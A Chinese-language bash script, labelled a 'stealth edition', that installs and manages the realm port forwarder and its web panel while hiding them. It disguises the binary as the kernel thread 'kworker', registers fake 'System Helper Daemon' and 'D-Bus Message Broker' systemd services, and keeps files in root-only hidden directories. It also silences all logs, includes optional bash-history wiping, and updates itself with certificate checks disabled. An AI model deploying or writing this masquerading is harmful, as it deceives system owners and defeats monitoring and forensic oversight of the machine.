#!/bin/bash

# ==========================================
# 系统服务管理脚本 (隐蔽版 v3.2.0)
# ==========================================

# --- 隐蔽配置 ---
sh_ver="3.2.0"
panel_ver="v2.1"

# 伪装名称（可自定义为其他系统进程名）
FAKE_NAME="kworker"           # 伪装成内核工作线程
FAKE_SERVICE="system-helper"  # 服务名伪装
FAKE_PANEL="dbus-broker"      # 面板服务伪装

# 颜色定义
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
PLAIN="\033[0m"

# 隐藏路径定义（使用隐藏目录）
REALM_DIR="/usr/lib/.${FAKE_NAME}"
REALM_BIN="${REALM_DIR}/${FAKE_NAME}"
CONFIG_DIR="/etc/.${FAKE_NAME}"
CONFIG_FILE="${CONFIG_DIR}/.conf"
SERVICE_FILE="/etc/systemd/system/${FAKE_SERVICE}.service"
PANEL_DIR="${REALM_DIR}/.web"
PANEL_BIN="${PANEL_DIR}/${FAKE_PANEL}"

# --- 状态检测函数 ---

get_status() {
    if systemctl is-active --quiet "$FAKE_SERVICE"; then
        echo -e "${GREEN}运行中${PLAIN}"
    else
        echo -e "${RED}未运行${PLAIN}"
    fi
}

get_panel_status() {
    if [ ! -f "$PANEL_BIN" ]; then
        echo -e "${RED}未安装${PLAIN}"
    elif systemctl is-active --quiet "${FAKE_PANEL}"; then
        echo -e "${GREEN}运行中${PLAIN}"
    else
        echo -e "${YELLOW}已安装但未启动${PLAIN}"
    fi
}

# --- 核心校验函数 ---

validate_port() {
    local port=$1
    if [[ "$port" =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]; then
        return 0
    else
        echo -e "${RED}错误: 端口必须是 1-65535 之间的数字。${PLAIN}"
        return 1
    fi
}

validate_ip() {
    local ip=$1
    if [[ -z "$ip" ]]; then
        echo -e "${RED}错误: 地址不能为空。${PLAIN}"
        return 1
    fi
    if [[ "$ip" =~ ^[a-zA-Z0-9\.\:\-]+$ ]]; then
        return 0
    else
        echo -e "${RED}错误: 无效的 IP 或域名格式。${PLAIN}"
        return 1
    fi
}

check_port_available() {
    local port=$1
    if command -v ss >/dev/null; then
        if ss -tulpn 2>/dev/null | grep -q ":${port} " | grep -v "$FAKE_NAME"; then
            echo -e "${RED}错误: 本机端口 ${port} 已被其他程序占用。${PLAIN}"
            return 1
        fi
    fi
    return 0
}

check_rule_exists() {
    local port=$1
    if [ -f "$CONFIG_FILE" ]; then
        if grep -q "listen = \"0.0.0.0:${port}\"" "$CONFIG_FILE"; then
            echo -e "${RED}错误: 端口 ${port} 的规则已存在。${PLAIN}"
            return 0
        fi
    fi
    return 1
}

# --- 基础功能 ---

init_env() {
    mkdir -p "$REALM_DIR"
    mkdir -p "$CONFIG_DIR"
    # 设置目录权限，防止普通用户发现
    chmod 700 "$REALM_DIR" "$CONFIG_DIR"
    [ ! -f "$CONFIG_FILE" ] && write_config_header
}

write_config_header() {
    cat <<EOF > "$CONFIG_FILE"
[network]
no_tcp = false
use_udp = true

EOF
    chmod 600 "$CONFIG_FILE"
}

check_dependencies() {
    local dependencies=("wget" "tar" "systemctl" "sed" "grep" "curl" "unzip" "ss")
    local missing=()
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null; then missing+=("$dep"); fi
    done
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}安装依赖: ${missing[*]} ...${PLAIN}"
        if [ -x "$(command -v apt-get)" ]; then
            apt-get update -y >/dev/null 2>&1 && apt-get install -y "${missing[@]}" iproute2 >/dev/null 2>&1
        elif [ -x "$(command -v yum)" ]; then
            yum install -y "${missing[@]}" iproute >/dev/null 2>&1
        else
            echo -e "${RED}请手动安装依赖。${PLAIN}"; exit 1
        fi
    fi
}

install_realm() {
    echo -e "${GREEN}> 部署服务...${PLAIN}"
    check_dependencies; init_env
    local version=$(curl -s https://api.github.com/repos/zhboner/realm/releases/latest 2>/dev/null | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
    [ -z "$version" ] && version="v2.6.0"
    
    local arch=$(uname -m)
    local filename=""
    case "$arch" in
        x86_64) filename="realm-x86_64-unknown-linux-gnu.tar.gz" ;;
        aarch64) filename="realm-aarch64-unknown-linux-gnu.tar.gz" ;;
        *) echo -e "${RED}不支持架构: $arch${PLAIN}"; return 1 ;;
    esac

    wget -q -O "/tmp/.cache.tar.gz" "https://github.com/zhboner/realm/releases/download/${version}/${filename}" 2>/dev/null || { echo -e "${RED}下载失败${PLAIN}"; return 1; }
    tar -xf /tmp/.cache.tar.gz -C "$REALM_DIR" 2>/dev/null && rm -f /tmp/.cache.tar.gz
    
    # 重命名二进制文件为伪装名
    mv "${REALM_DIR}/realm" "$REALM_BIN" 2>/dev/null
    chmod +x "$REALM_BIN"

    # 创建伪装的systemd服务（带隐蔽描述和日志抑制）
    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Helper Daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
Restart=on-failure
RestartSec=5s
WorkingDirectory=${REALM_DIR}
ExecStart=${REALM_BIN} -c ${CONFIG_FILE}
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
    chmod 644 "$SERVICE_FILE"
    
    systemctl daemon-reload
    systemctl enable "$FAKE_SERVICE" >/dev/null 2>&1
    systemctl restart "$FAKE_SERVICE"
    
    # 清理bash历史（可选，取消注释启用）
    # history -c && history -w
    
    echo -e "${GREEN}安装完成${PLAIN}"
}

uninstall_realm() {
    read -p "确定卸载? [y/N]: " confirm
    [[ "$confirm" != "y" && "$confirm" != "Y" ]] && return
    systemctl stop "$FAKE_SERVICE" 2>/dev/null
    systemctl disable "$FAKE_SERVICE" 2>/dev/null
    rm -f "$SERVICE_FILE"
    systemctl daemon-reload
    rm -rf "$REALM_DIR"
    read -p "删除配置? [y/N]: " del_conf
    [[ "$del_conf" == "y" || "$del_conf" == "Y" ]] && rm -rf "$CONFIG_DIR"
    echo -e "${GREEN}已卸载${PLAIN}"
}

# --- 转发管理 ---

add_forward() {
    echo -e "${YELLOW}>>> 添加转发 (连续错误2次自动返回)${PLAIN}"
    
    local attempt=0
    while true; do
        read -e -p "本机端口: " lp
        if ! validate_port "$lp"; then
            ((attempt++)); [ $attempt -ge 2 ] && { echo -e "${RED}错误过多，返回主菜单${PLAIN}"; return; }
            continue
        fi
        if ! check_port_available "$lp"; then
            ((attempt++)); [ $attempt -ge 2 ] && { echo -e "${RED}错误过多，返回主菜单${PLAIN}"; return; }
            continue
        fi
        if check_rule_exists "$lp"; then
            ((attempt++)); [ $attempt -ge 2 ] && { echo -e "${RED}错误过多，返回主菜单${PLAIN}"; return; }
            continue
        fi
        break
    done

    attempt=0
    while true; do
        read -e -p "落地IP/域名: " rip
        if ! validate_ip "$rip"; then
             ((attempt++)); [ $attempt -ge 2 ] && { echo -e "${RED}错误过多，返回主菜单${PLAIN}"; return; }
             continue
        fi
        break
    done

    attempt=0
    while true; do
        read -e -p "落地端口: " rp
        if ! validate_port "$rp"; then
            ((attempt++)); [ $attempt -ge 2 ] && { echo -e "${RED}错误过多，返回主菜单${PLAIN}"; return; }
            continue
        fi
        break
    done

    cat <<EOF >> "$CONFIG_FILE"

[[endpoints]]
listen = "0.0.0.0:$lp"
remote = "$rip:$rp"
EOF
    restart_service
}

add_range_forward() {
    echo -e "${YELLOW}>>> 端口段转发 (连续错误2次自动返回)${PLAIN}"
    local attempt=0
    
    while true; do read -e -p "落地IP: " rip; validate_ip "$rip" && break; ((attempt++)); [ $attempt -ge 2 ] && return; done
    attempt=0; while true; do read -e -p "起始端口: " sp; validate_port "$sp" && break; ((attempt++)); [ $attempt -ge 2 ] && return; done
    attempt=0; while true; do read -e -p "结束端口: " ep; validate_port "$ep" && break; ((attempt++)); [ $attempt -ge 2 ] && return; done
    attempt=0; while true; do read -e -p "落地基准端口: " rbp; validate_port "$rbp" && break; ((attempt++)); [ $attempt -ge 2 ] && return; done

    [ "$sp" -ge "$ep" ] && { echo -e "${RED}起始必须小于结束${PLAIN}"; return; }

    echo "生成中..."
    local rp=$rbp
    for ((p=$sp; p<=$ep; p++)); do
        if ! grep -q "listen = \"0.0.0.0:$p\"" "$CONFIG_FILE"; then
            cat <<EOF >> "$CONFIG_FILE"

[[endpoints]]
listen = "0.0.0.0:$p"
remote = "$rip:$rp"
EOF
        fi
        ((rp++))
    done
    restart_service
}

delete_forward() {
    [ ! -f "$CONFIG_FILE" ] && return
    local listens=($(grep "listen =" "$CONFIG_FILE" | awk -F'"' '{print $2}'))
    local remotes=($(grep "remote =" "$CONFIG_FILE" | awk -F'"' '{print $2}'))
    [ ${#listens[@]} -eq 0 ] && { echo "无规则"; return; }

    echo "==============="
    for ((i=0; i<${#listens[@]}; i++)); do
        echo -e "${GREEN}$((i+1)).${PLAIN} ${listens[i]} -> ${remotes[i]}"
    done
    echo "==============="
    read -p "删除序号(0取消): " c
    [[ "$c" == "0" || -z "$c" ]] && return
    
    cp "$CONFIG_FILE" "${CONFIG_FILE}.bak"
    write_config_header
    local del_idx=$((c-1))
    for ((i=0; i<${#listens[@]}; i++)); do
        if [ $i -ne $del_idx ]; then
            cat <<EOF >> "$CONFIG_FILE"

[[endpoints]]
listen = "${listens[i]}"
remote = "${remotes[i]}"
EOF
        fi
    done
    restart_service
}

# --- 服务控制 ---
start_service() { systemctl start "$FAKE_SERVICE" 2>/dev/null; echo "已启动"; }
stop_service() { systemctl stop "$FAKE_SERVICE" 2>/dev/null; echo "已停止"; }
restart_service() { 
    systemctl daemon-reload
    systemctl restart "$FAKE_SERVICE" 2>/dev/null
    sleep 1
    systemctl is-active --quiet "$FAKE_SERVICE" && echo -e "${GREEN}重启成功${PLAIN}" || echo -e "${RED}重启失败${PLAIN}"
}

# --- 面板管理 ---
panel_management() {
    while true; do
        clear
        echo "=== 面板管理 ($panel_ver) ==="
        echo -e "面板状态: $(get_panel_status)"
        echo "============================="
        echo "1. 安装面板"
        echo "2. 启动面板"
        echo "3. 停止面板"
        echo "4. 卸载面板"
        echo "0. 返回上级"
        read -p "选择: " pc
        case $pc in
            1) install_panel ;;
            2) systemctl start "$FAKE_PANEL" 2>/dev/null; echo "尝试启动..." ;;
            3) systemctl stop "$FAKE_PANEL" 2>/dev/null; echo "已停止" ;;
            4) uninstall_panel ;;
            0) break ;;
            *) echo "无效选择" ;;
        esac
        read -p "按回车继续..."
    done
}

install_panel() {
    check_dependencies
    local arch=$(uname -m)
    local p_file=""
    case "$arch" in
        x86_64) p_file="realm-panel-linux-amd64.zip" ;;
        aarch64|arm64) p_file="realm-panel-linux-arm64.zip" ;;
        *) echo "不支持架构: $arch"; return ;;
    esac

    mkdir -p "$PANEL_DIR"
    chmod 700 "$PANEL_DIR"
    local url="https://github.com/cyclestudy/realm/releases/download/${panel_ver}/${p_file}"
    if wget -q -O "/tmp/.panel.zip" "$url" 2>/dev/null; then
        unzip -o -q "/tmp/.panel.zip" -d "$PANEL_DIR" && rm -f "/tmp/.panel.zip"
        mv "${PANEL_DIR}/realm_web" "$PANEL_BIN" 2>/dev/null
        chmod +x "$PANEL_BIN"
        
        cat <<EOF > "/etc/systemd/system/${FAKE_PANEL}.service"
[Unit]
Description=D-Bus Message Broker
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${PANEL_DIR}
ExecStart=${PANEL_BIN}
Restart=on-failure
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl enable "$FAKE_PANEL" >/dev/null 2>&1
        systemctl start "$FAKE_PANEL"
        echo -e "${GREEN}面板安装成功!${PLAIN}"
    else
        echo -e "${RED}下载失败${PLAIN}"
    fi
}

uninstall_panel() {
    systemctl stop "$FAKE_PANEL" 2>/dev/null
    systemctl disable "$FAKE_PANEL" 2>/dev/null
    rm -f "/etc/systemd/system/${FAKE_PANEL}.service"
    systemctl daemon-reload
    rm -rf "$PANEL_DIR"
    echo "已卸载"
}

# --- 脚本更新 ---
Update_Shell() {
    local url="https://raw.githubusercontent.com/cyclestudy/realm/main/realm.sh"
    local new_ver=$(wget -qO- "$url" 2>/dev/null | grep 'sh_ver="' | awk -F "=" '{print $NF}' | tr -d '"' | head -1)
    [[ -z "$new_ver" ]] && { echo -e "${RED}检测失败${PLAIN}"; return; }
    [[ "$new_ver" == "$sh_ver" ]] && { echo "已是最新"; return; }
    read -p "更新到 $new_ver? [y/N]: " yn
    [[ "$yn" =~ ^[Yy]$ ]] && wget -q -N --no-check-certificate "$url" -O realm.sh && chmod +x realm.sh && echo "已更新" && exit 0
}

# --- 自清理函数 ---
self_clean() {
    # 清理下载缓存
    rm -f /tmp/.cache.tar.gz /tmp/.panel.zip 2>/dev/null
    # 可选：清理bash历史中的敏感命令
    # sed -i '/realm/d' ~/.bash_history 2>/dev/null
}

# --- 主菜单（已去除明显标识）---
show_menu() {
    clear
    echo "################################################"
    echo "#          系统服务管理 (v${sh_ver})              #"
    echo "################################################"
    echo -e " 服务状态: $(get_status)"
    echo -e " 面板状态: $(get_panel_status)"
    echo "------------------------------------------------"
    echo "  1. 安装 / 重置 服务"
    echo "  2. 卸载 服务"
    echo "------------------------------------------------"
    echo "  3. 添加转发规则"
    echo "  4. 添加端口段转发"
    echo "  5. 删除转发规则"
    echo "  6. 查看当前配置"
    echo "------------------------------------------------"
    echo "  7. 启动服务"
    echo "  8. 停止服务"
    echo "  9. 重启服务"
    echo "------------------------------------------------"
    echo "  10. 更新脚本"
    echo "  11. 面板管理"
    echo "  0. 退出脚本"
    echo "################################################"
}

main() {
    check_dependencies
    init_env
    trap self_clean EXIT  # 退出时自动清理
    while true; do
        show_menu
        read -p "选择 [0-11]: " opt
        case $opt in
            1) install_realm ;;
            2) uninstall_realm ;;
            3) add_forward ;;
            4) add_range_forward ;;
            5) delete_forward ;;
            6) cat "$CONFIG_FILE" 2>/dev/null ;;
            7) start_service ;;
            8) stop_service ;;
            9) restart_service ;;
            10) Update_Shell ;;
            11) panel_management ;;
            0) exit 0 ;;
            *) echo "无效" ;;
        esac
        [ "$opt" != "0" ] && read -p "按回车返回..."
    done
}

main
